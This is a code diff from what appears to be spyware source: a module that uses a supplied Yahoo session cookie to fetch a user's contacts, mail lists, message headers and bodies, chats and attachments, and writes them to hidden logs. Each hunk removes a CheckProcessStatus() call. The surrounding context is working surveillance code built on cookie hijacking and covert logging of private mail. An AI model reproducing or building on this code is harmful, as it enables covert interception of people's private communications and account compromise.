@@ -240,7 +240,6 @@ DWORD YHGetConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie
 	DWORD	dwRet, dwBufferSize;
 
 	//connection to mail server
-	CheckProcessStatus();
 	dwRet = HttpSocialRequest(L"mail.yahoo.com", L"GET", strURI, 443, NULL, 0, (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
 	znfree((LPVOID*)&strURI);
 	
@@ -305,7 +304,6 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 	if(jValue == NULL)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 
-	CheckProcessStatus();
 	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
 
 	if (jValue != NULL && jValue->IsObject())
@@ -483,7 +481,6 @@ DWORD YHParseContacts(LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams)
 	if(strURI == NULL)
 		return YAHOO_ALLOC_ERROR;
 
-	CheckProcessStatus();
 	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE,  L"/neo/ws/sd?/v1/user/%s/contacts;format=json&view=compact", pYHParams->strNeoGUID);
 	dwRet = HttpSocialRequest(pYHParams->strServerName, L"GET", strURI, 443, NULL, 0, (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie);
 	znfree((LPVOID*)&strURI);
@@ -669,7 +666,6 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 					bIncoming = FALSE;
 */
 				bIncoming = FALSE;
-				CheckProcessStatus();
 				LogSocialIMMessageW(CHAT_PROGRAM_YAHOO, ChatFields.strPeers, ChatFields.strPeersID, ChatFields.strAuthor, ChatFields.strAuthorID, ChatFields.strText, &tstamp, bIncoming);
 			}
 
@@ -685,7 +681,6 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 				dwLen = strlen(strMail);
 				if(dwLen > max_social_mail_len)
 					dwLen = max_social_mail_len;
-				CheckProcessStatus();
 				LogSocialMailMessageFull(MAIL_YAHOO, (BYTE *)strMail, dwLen, bIncoming, bDraft);
 			}
 		}
@@ -766,7 +761,6 @@ DWORD YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	//post params
 	_snprintf_s(strPostBuffer, YAHOO_ALLOC_SIZE, _TRUNCATE, strJSONParams, strMailBoxName, dwNrOfMails, 0);
 
-	CheckProcessStatus();
 	//json command to retrieve the mail list
 	dwRet = HttpSocialRequest(pYHParams->strServerName, L"POST", strURI, 443, (BYTE *)strPostBuffer, strlen(strPostBuffer), (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie);
 
@@ -883,7 +877,6 @@ DWORD YHGetFoldersName(JSONValue** jValue, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 	}
 	strcpy_s(strPostBuffer, YAHOO_ALLOC_SIZE, strJSONParams);
 
-	CheckProcessStatus();
 	//json command to retrieve the mail list	
 	dwRet = HttpSocialRequest(pYHParams->strServerName, L"POST", strURI, 443, (BYTE *)strPostBuffer, strlen(strPostBuffer), (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie);
 
@@ -1004,7 +997,6 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 	}
 	_snprintf_s(strBuffer, dwSize, _TRUNCATE, strGetHeader, pYHParams->strMailFolder, strMailID);
 
-	CheckProcessStatus();
 	//json command to retrieve the mail header
 	dwRet = HttpSocialRequest(pYHParams->strServerName, L"POST", strURI, 443, (BYTE *)strBuffer, strlen(strBuffer), (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie);
 
@@ -1193,7 +1185,6 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 	//post buffer
 	_snprintf_s(strBuffer, dwSize, _TRUNCATE, strGetMsg, lpYHParams->strMailFolder, strMailID); // FIXME ARRAY	
 
-	CheckProcessStatus();
 	//json command to retrieve the mail list
 	dwRet = HttpSocialRequest(lpYHParams->strServerName, L"POST", strURI, 443, (BYTE *)strBuffer, strlen(strBuffer), (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
 
@@ -1745,7 +1736,6 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 	//post buffer
 	_snprintf_s(strBuffer, dwSize, _TRUNCATE, strGetMsg, lpYHParams->strMailFolder, strChatID);
 
-	CheckProcessStatus();
 	//json command to retrieve the mail list
 	dwRet = HttpSocialRequest(lpYHParams->strServerName, L"POST", strURI, 443, (BYTE *)strBuffer, strlen(strBuffer), (BYTE  **)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
 
@@ -2145,7 +2135,6 @@ DWORD YHGetMailAttachment(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ya/download?mid=%S&fid=%s&pid=%s&tnef=&clean=0", strEncoded, pYHParams->strMailFolder, pYHMailFields->strPartId);
 	znfree((LPVOID*)&strEncoded);
 
-	CheckProcessStatus();
 	//command to retrieve the attachment
 	dwRet = HttpSocialRequest(pYHParams->strServerName, L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie);
 	znfree((LPVOID*)&strURI);
